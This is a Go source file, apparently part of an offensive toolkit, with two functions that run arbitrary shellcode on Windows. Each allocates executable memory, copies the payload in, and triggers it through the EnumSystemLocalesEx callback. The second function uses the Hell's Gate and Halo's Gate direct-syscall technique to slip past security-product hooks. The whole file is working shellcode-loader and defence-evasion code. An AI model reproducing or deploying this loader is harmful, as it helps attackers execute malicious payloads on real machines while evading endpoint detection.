package core

import (
  "unsafe"

  "golang.org/x/sys/windows"
)

func EnumSystemLocales(shellcode []byte) (error) {

  kernel32 := windows.NewLazyDLL("kernel32.dll")
  ntdll := windows.NewLazyDLL("ntdll.dll")
  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
  EnumSystemLocalesEx := kernel32.NewProc("EnumSystemLocalesEx")

  addr, _, err := VirtualAlloc.Call(
    0,
    uintptr(len(shellcode)),
    windows.MEM_COMMIT|windows.MEM_RESERVE,
    windows.PAGE_EXECUTE_READWRITE,
  )

  if (addr == 0) {
    return err
  }

  RtlMoveMemory.Call(
    addr,
    (uintptr)(unsafe.Pointer(&shellcode[0])),
    uintptr(len(shellcode)),
  )

  EnumSystemLocalesEx.Call(
    addr,
    0,
    0,
    0,
  )

  return nil
}

/*

Hell's Gate + Halo's Gate technique

*/

func EnumSystemLocalesHalos(shellcode []byte) (error) {

  kernel32 := windows.NewLazyDLL("kernel32.dll")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  EnumSystemLocalesEx := kernel32.NewProc("EnumSystemLocalesEx")

  NtAllocateVirtualMemory, err := GetSysId("NtAllocateVirtualMemory")
  if err != nil {
    return err
  }

  NtWriteVirtualMemory, err := GetSysId("NtWriteVirtualMemory")
  if err != nil {
    return err
  }

  pHandle, _, _ := GetCurrentProcess.Call()

  var addr uintptr
  regionsize := uintptr(len(shellcode))

  r1, err := Syscall(
    NtAllocateVirtualMemory,
    uintptr(pHandle),
    uintptr(unsafe.Pointer(&addr)),
    0,
    uintptr(unsafe.Pointer(&regionsize)),
    windows.MEM_COMMIT|windows.MEM_RESERVE,
    windows.PAGE_EXECUTE_READWRITE,
  )

  if (r1 != 0) {
    return err
  }

  Syscall(
    NtWriteVirtualMemory,
    uintptr(pHandle),
    addr,
    uintptr(unsafe.Pointer(&shellcode[0])),
    uintptr(len(shellcode)),
    0,
  )
  
  EnumSystemLocalesEx.Call(
    addr,
    0,
    0,
    0,
  )

  return nil
}

